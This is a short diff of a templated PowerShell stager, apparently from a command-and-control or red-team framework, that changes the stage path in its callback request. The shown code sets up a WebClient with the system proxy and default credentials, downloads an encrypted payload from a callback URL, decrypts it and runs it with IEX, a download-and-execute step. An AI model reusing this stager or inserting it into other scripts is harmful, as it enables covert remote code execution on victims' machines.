@@ -76,6 +76,6 @@ $settings[$string5].Add($string6, "0")
 $K=new-object net.webclient
 $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
 $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
-$code = {{symbol_name("Decrypt-String")}} ($K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'1'))
+$code = {{symbol_name("Decrypt-String")}} ($K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))
 
 IEX $code
